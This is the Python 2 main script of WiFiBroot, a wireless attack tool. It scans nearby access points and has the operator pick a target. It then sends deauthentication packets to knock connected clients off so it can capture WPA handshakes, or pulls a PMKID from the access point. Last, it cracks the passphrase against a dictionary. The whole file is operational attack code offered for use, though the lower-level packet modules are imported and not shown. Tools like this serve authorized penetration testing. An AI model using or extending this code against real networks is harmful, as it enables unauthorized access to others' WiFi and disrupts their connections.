# hash3lizer/wifibroot.py
# Twitter: @hash3liZer
# Website: https://www.shellvoide.com
# Email: admin@shellvoide.com

import optparse
import os
import sys
import re
import subprocess
import threading
import time
import random
import exceptions
from pull import Pully
from screen import Display
from signal import signal, SIGINT
from wireless import Shifter
from wireless import Sniper
from wireless import PSK
from wireless import eAPoL
from wireless import PMKID
from scapy.utils import rdpcap
from scapy.utils import PcapWriter
from utils import tabulate
from utils import org

WRITE__ = True
DICTIONARY = ''
NEW_HAND = False
V__ = bool(0)
_KEY_ = None

class interface:

	stop_hopper = 0
	__STATUS_END = 0
	cch = 1

	def __init__(self, iface):
		self.iface = iface
		self.interfaces = self.list_ifaces()
		self.check_help = ''
		self.check_man = self.check_man()
		self.check_mon = self.check_mon()

	def check_man(self):
		if self.is_iface(self.iface):
			if self.is_man(self.iface):
				return True
			else:
				self.check_help = "Wireless interface isn't in Managed Mode"
				return False
		else:
			self.check_help = "There's no such interface: %s" % (self.iface)
			return False

	def check_mon(self):
		if self.is_iface(self.iface):
			if self.is_mon(self.iface):
				return True
			else:
				self.check_help = "Wireless interface isn't in Monitor Mode"
				return False
		else:
			self.check_help = "There's no such interface: %s" % (self.iface)
			return False

	def list_ifaces(self):
		ifaces = []
		dev = open('/proc/net/dev', 'r')
		data = dev.read()
		for facecard in re.findall('[a-zA-Z0-9]+:', data):
			ifaces.append(facecard.rstrip(":"))
		dev.close()
		return ifaces

	def is_iface(self, iface):
		if iface in self.interfaces:
			return True
		else:
			return False

	def is_mon(self, iface):
		co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
		data = co.communicate()[0]
		card = re.findall('Mode:[A-Za-z]+', data)[0]
		if "Monitor" in card:
			return True
		else:
			return False

	def is_man(self, iface):
		co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
		data = co.communicate()[0]
		card = re.findall('Mode:[A-Za-z]+', data)[0]
		if "Managed" in card:
			return True
		else:
			return False

	def put_channel(self, ch):
		os.system('iwconfig %s channel %s' % (self.iface, ch))
		if V__:
			pull.info('Operating on channel: %s' % ch)
		self.cch = int(ch)
		return ch

	def hopper(self):
		pull.up('Starting Channel Hopping. Channel will couple time every second')
		#if subprocess.call(['sudo','iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
		#	pull.error('iwconfig not found. Make sure it is installed and you have neccassery privileges')
		#	sys.exit(-1)
		thread = threading.Thread(target=self.hop_channels, name="hopper")
		thread.daemon = True
		thread.start()

	def hop_channels(self):
		n = 1
		while not self.stop_hopper:
			self.cch = n
			time.sleep(0.40)
			os.system('iwconfig %s channel %d' % (self.iface, n))
			dig = int(random.random() * 14)
			if dig != 0 and dig != n:
				n = dig
		self.__STATUS_END = 1

	def shift_channel(self, ch):
		os.system('iwconfig %s channel %d' % (self.iface, ch))
		return ch

	def put_mon(self):
		pass

	def put_man(self):
		pass

class Sniffer:

	WiFiAP = []

	def __init__(self, iface, bssid=None, essid=None):
		self.iface1 = iface
		self.bssid = bssid
		self.essid = essid
		self.shift = Shifter(self.iface1.iface, self.bssid, self.essid, V__)
		signal(SIGINT, self.break_shifter)
		self.aps()

	def aps(self):
		pull.up('Scanning through the Area. Press [%sCTRL+C%s] to Stop. ' % (pull.BOLD, pull.END))
		time.sleep(1)
		self.screen = Display()
		thread = threading.Thread(target=self.screen.Shifter, args=(self.shift, self.iface1,), name="Verbose Sniffer")
		thread.daemon = True
		thread.start()
		self.shift.run()

	def break_shifter(self, sig, frame):
		self.screen.shifter_break = True
		while not self.screen.Shifter_stopped:
			pass
		self.screen.clear()
		del self.screen

		__HEADERS = [pull.BOLD+'NO', 'ESSID', 'PWR', 'ENC', 'CIPHER', 'AUTH', 'CH', 'BSSID'+pull.END]
		tabulator__ = []
		###
		__sig_LIST = []
		for ap in self.shift.results():
			__sig_LIST.append(ap['pwr'])
		__sig_LIST = sorted(__sig_LIST, reverse=True)
		###
		count = 1
		for sig in __sig_LIST:
			for ap in self.shift.results():
				if ap['pwr'] == sig:
					ap['count'] = count
					count += 1; self.shift.results().remove(ap)
					self.WiFiAP.append(ap)
		###
		for ap in self.WiFiAP:
			tabulator__.append([ap['count'], ap['essid'], ap['pwr'], ap['auth'], ap['cipher'], \
					ap['psk'], ap['channel'], ap['bssid'].upper()])
		print "\n"+tabulate(tabulator__, headers=__HEADERS)+"\n"
		os.kill(os.getpid(), SIGINT)

class Phazer:

	def __init__(self, sniffer):
		self.iface = sniffer.iface1
		self.WiFiAP = sniffer.WiFiAP

	def count_input(self):
		while True:
			try:
				count = pull.question('Enter Your Target Number [q]uit/[n]: ')
				return count
			except:
				pass

	def get_input(self):
		while True:
			count = self.count_input()
			if count == 'q' or count == 'Q':
				sys.exit(0)
			for AP in self.WiFiAP:
				if str(AP['count']) == count:
					return AP

	def call_PSK(self, eapol, essid, enc):
		self.psk = PSK(eapol, essid, enc, DICTIONARY, V__, _KEY_)
		pass__, _PMK_, _KCK_, _MIC_ = self.psk.broot()

		if pass__:
			pull.use('Found: %s' % pass__)

			if V__:
				pull.right('PMK: ')
				print _PMK_
				pull.right('PTK: ')
				print _KCK_
				pull.right('MIC: ')
				print _MIC_

			return True
		else:
			pull.error("Sorry, but the Password is not in the dictionary. Try enlarging it. ")
			return False

	def discard_p_hand(self, bss):
		f_name = 'handshakes'
		filename = bss.replace(':', '').lower()
		if os.path.isfile(os.path.join(os.getcwd(), f_name, '%s.cap' % filename)):
			os.remove(os.path.join(os.getcwd(), f_name, '%s.cap' % filename))
			return 1
		else:
			return 0

	def verify_h_crack(self, bss):
		f_name = 'handshakes'
		tgt__ = bss.replace(':', '').lower()

		self.c_v_path(os.path.join(os.getcwd(), f_name))
		
		if not os.path.isfile(os.path.join(os.getcwd(), f_name, '%s.cap' % (tgt__))):
			return (False, None)
		else:
			return (True, os.path.join(os.getcwd(), f_name, '%s.cap' % (tgt__)))

	def h_crack(self, ap, p_to_h):
		if V__:
			pull.up('Reading Packets from Captured File: %s'\
						 % p_to_h)
		pkts = rdpcap(p_to_h)
		gen = eAPoL(ap['bssid'])
		for pkt in pkts:
			comp__ = gen.check(pkt)
			if comp__:
				if V__:
					pull.info('Valid Handshake Found. Manipulaing Data ...')
					pull.right('AP Manufacturer: %s' % (org(ap['bssid']).org))
				break
		pols = gen.get_pols()
		self.call_PSK(pols, ap['essid'], ap['auth'])

	def d_h_crack(self, ap, timeout, deauth):
		global WRITE__

		y_h = False

		while not y_h:

			pull.up('Locating Clients from AP to generate handshake. Sleeping for %d Seconds. ' % timeout)
			self.sniper = Sniper(self.iface, ap['bssid'], ap['essid'], ap['channel'], timeout)
			self.sniper.cl_generator()
			cls__ = self.sniper.clients()
			pull.info('Clients Detected. Number of Connected Users: %d' % len(cls__))

			if cls__:
				for tup in cls__:
					if V__:
						pull.up('Attempting to Dissociate %s from AP. Detected Range: %d'\
								 % (pull.RED+tup[0].upper()+pull.END, tup[1] if tup[1] != -999 else -1))
					else:
						pull.up('Attempting to Dissociate %s from Access Point.'\
									 % (pull.RED+tup[0].upper()+pull.END))
					pkts__ = self.sniper.shoot(tup[0], deauth)
					if V__:
						pull.up('Checking For Valid Handshake b/w "%s" and "%s"'\
									 % (pull.BOLD+ap['essid']+pull.END, pull.BOLD+tup[0].upper()+pull.END))
					if pkts__[0]:
						y_h = not False
						if V__:
							pull.use('Handshake SucessFull. MAC: %s' % tup[0].upper())
							pull.right('Vendor (AP): %s Vendor (Client): %s'\
										 % (org(ap['bssid']).org, org(tup[0]).org) )
						else:
							pull.use('Handshake Got Successful. Attempting to Save it. ')
						if WRITE__:
							h_path = self.save_handshake(pkts__[1], ap['bssid'])
							if V__:
								pull.info('Saved handshake in %s' % h_path)
						if self.call_PSK(pkts__[1], ap['essid'], ap['auth']):
							sys.exit(0)
					else:
						pull.error('No Handshake Found. Skippingg to Next Client ...')
						time.sleep(2)
			else:
				pull.error('Sorry, but shutting Down. No connected users found in the target network.')
				sys.exit(0)

	def save_handshake(self, pkts, bss):
		f_name = 'handshakes'
		fi_name = '%s.cap' % (bss.replace(':', '').lower())

		self.c_v_path(os.path.join(os.getcwd(), f_name))
		
		file__ = PcapWriter(os.path.join(os.getcwd(), f_name, fi_name), append=True, sync=True)
		for pkt in pkts:
			file__.write(pkt)
		file__.close()
		return os.path.join(os.getcwd(), f_name, fi_name)

	def c_v_path(self, directory):
		if not os.path.exists(directory):
			os.makedirs(directory)

class pmkid_GEN:

	def __init__(self, iface_instance, ap_instance):
		self.ap_instance = ap_instance
		self.iface_instance = iface_instance
		self.pmkid = PMKID(self.ap_instance['bssid'], self.ap_instance['essid'], self.iface_instance.iface, self.ap_instance['beacon'], DICTIONARY, _KEY_, pull, V__)
		self.channel = self.channel(self.ap_instance['channel'])

	def auth_gen(self):
		to_return = self.pmkid.dev_conn()
		self.pmkid._PMKID__AUTH_STEP = False
		return to_return

	def asso_gen(self):
		_PACT = False
		while not _PACT:
			_PACT = self.pmkid.asso_conn()
			pull.special("Times Up! Attempting to authenticate with Access Point.")
			self.auth_gen()
		return _PACT

	def lets_crack(self):
		_pass, _hash, _hash_ = self.pmkid.crack()
		if _pass is None:
			pull.error("Password Not Found in Dictionary. Try enlarging it!")
			sys.exit()
		else:
			pull.use("Password Found: %s%s%s" % (pull.BOLD, _pass, pull.END))
			if V__:
				pull.right("PMKID: ")
				print _hash_
				pull.right("PMK: ")
				print _hash

	def channel(self, _ch):
		self.iface_instance.put_channel(_ch)
		return _ch

def grace_exit(sig, frame):
	pull.special("Closing. Cleaning up the mess! ")
	time.sleep(2)
	sys.exit(0)

def main():
	global WRITE__, DICTIONARY, NEW_HAND, V__, _KEY_

	parser = optparse.OptionParser(add_help_option=False)
	parser.add_option('-h', '--help', dest='help', default=False, action="store_true", help="Show this help manual")
	parser.add_option('-m', '--mode', dest='mode', type='int', default=1, help="Mode to Use. ")
	parser.add_option('-i', '--interface', dest="interface", type='string', help="Monitor Wireless Interface to use")
	parser.add_option('-e', '--essid', dest="essid", type='string', help="Targets AP's with the specified ESSIDs")
	parser.add_option('-b', '--bssid', dest="bssid", type='string', help="Targets AP's with the specified BSSIDs")
	parser.add_option('-c', '--channel', dest="channel", type='int', help="Listen on specified channel.")
	parser.add_option('-p', '--passwords', dest="password", type='string', help="Check the AP against provided WPA Key Passphrases, seperated by comma.")
	parser.add_option('-d', '--dictionary', dest='dictionary', type='string', help="Dictionary containing Passwords")
	parser.add_option('', '--newhandshake', dest='newhandshake', default=False, action="store_true", help="Discard previous handshake and capture new one. ")
	parser.add_option('', '--nowrite', dest="write", default=True, action="store_false", help="Do not Save the Captured Handshakes")
	parser.add_option('', '--deauth', dest='deauth', type='int', default=32, help="Deauth Packets to send. ")
	parser.add_option('-t', '--timeout', dest="timeout", default=20, type='int', help="Specify timeout for locating target clients. ")
	parser.add_option('-v', '--verbose', dest="verbose", default=False, action="store_true", help="Print hashes and verbose messages. ")
	
	(options, args) = parser.parse_args()

	if options.help == True:
		pull.help()
		sys.exit(0)

	if options.password != None:
		_KEY_ = options.password	

	if options.write == False:
		WRITE__ = not True

	if options.dictionary == None:
		DICTIONARY = os.path.join(os.getcwd(), 'dicts', 'list.txt')
	else:
		if os.path.isfile(options.dictionary):
			DICTIONARY = options.dictionary
		else:
			pull.error('No such File: %s' % (options.dictionary))
			sys.exit(-1)

	if options.newhandshake == True:
		NEW_HAND = not False

	if options.verbose == True:
		V__ = bool(1)

	if options.interface != None:
		iface = interface(options.interface)
		if iface.check_mon == False:
			pull.error(iface.check_help)
			sys.exit(-1)
		if options.channel == None:
			iface.hopper()
		else:
			__channels = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14)
			if options.channel in __channels:
				iface.put_channel(options.channel)
			else:
				pull.error('Selected Channel is not a legal one. Please choose a valid one.')
				iface.hopper()
	else:
		pull.error('Interface Required. Please supply -i argument.')
		sys.exit(-1)

	if options.essid != None or options.bssid != None:
		if options.essid != None and options.bssid != None:
			sniffer = Sniffer(iface, options.bssid, options.essid)
		elif options.bssid != None:
			sniffer = Sniffer(iface, bssid=options.bssid)
		elif options.essid != None:
			sniffer = Sniffer(iface, essid=options.essid)
	else:
		pull.info("No Network has been Specified. ")
		sniffer = Sniffer(iface)

	if options.mode == 1:
		phaser = Phazer(sniffer)
		target = phaser.get_input()
		signal(SIGINT, grace_exit)
		pull.info("You've choosed \"%s\" with encryption %s" % (target['essid'], target['auth']))
		if not phaser.verify_h_crack(target['bssid'])[0] or NEW_HAND == True:
			if NEW_HAND:
				d_carded__ = phaser.discard_p_hand(target['bssid'])
				if d_carded__:
					pull.delete('Discarded Previous Handshake for "%s"' % (pull.BOLD+target['essid']+pull.END))
				else:
					pull.info('Attempting to Capture new handshake for "%s"' % (pull.BOLD+target['essid']+pull.END))
			phaser.d_h_crack(target, int(options.timeout), options.deauth)
		else:
			pull.use("We've already got the handshake for this network. Attempting to Crack it.")
			phaser.h_crack(target, phaser.verify_h_crack(target['bssid'])[1])
	elif options.mode == 2:
		pmk = pmkid_GEN(iface, Phazer(sniffer).get_input())
		signal(SIGINT, grace_exit)
		if pmk.auth_gen():
			if pmk.asso_gen():
				pmk.lets_crack()

if __name__ == "__main__":
	pull = Pully()
	pull.logo()
	if not 'linux' in sys.platform:
		pull.error("Not Supportable Operating System!")
		sys.exit(1)
	main()